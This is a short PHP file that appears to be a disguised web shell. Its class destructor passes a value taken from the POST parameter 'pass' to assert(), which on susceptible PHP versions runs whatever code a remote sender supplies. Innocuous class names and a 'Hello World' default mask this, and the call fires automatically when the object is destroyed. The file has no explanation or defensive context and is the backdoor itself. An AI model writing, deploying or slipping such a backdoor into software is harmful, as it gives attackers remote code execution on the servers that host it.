<?php 
class white{
  public $black = 'Hello World';
  function __destruct(){
    assert("$this->black");
  }
}
$b = new white;
$b->black = $_POST['pass'];
